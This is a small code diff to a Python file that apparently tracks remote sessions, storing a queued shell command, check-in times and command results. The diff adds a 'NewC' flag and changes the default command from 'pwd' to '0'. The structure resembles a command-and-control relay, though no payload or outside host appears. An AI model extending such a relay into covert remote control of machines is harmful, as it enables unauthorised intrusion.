@@ -62,6 +62,7 @@ def session():
             Res = comm["Result"]
             # Set the command to 0
             structure = {
+                "NewC": "0",
                 "Command": "0",
                 "LastInteraction": f"{LastInteraction}",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
@@ -87,7 +88,7 @@ def schema():
     else:
         # Let's convert the command struct to a JSON object
         structure = {
-            "Command": "pwd",
+            "Command": "0",
             "LastInteraction": "0",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
             "Result": f"{result}"
